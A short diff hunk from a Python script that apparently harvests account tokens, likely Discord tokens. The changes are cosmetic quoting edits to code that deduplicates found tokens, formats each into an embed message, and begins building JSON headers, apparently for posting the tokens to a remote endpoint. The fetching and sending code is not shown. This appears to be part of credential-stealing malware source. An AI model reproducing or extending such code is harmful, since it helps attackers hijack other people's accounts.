@@ -143,9 +143,9 @@ def main():
                 if token in checked:
                     continue
                 checked.append(token)
-                embedMsg += f"""**Token:** ```{token}```"""
+                embedMsg += f"**Token:** ```{token}```"
         else:
-            embedMsg = '''```No tokens found.```'''
+            embedMsg = '```No tokens found.```'
 
     headers = {
         'Content-Type': 'application/json',
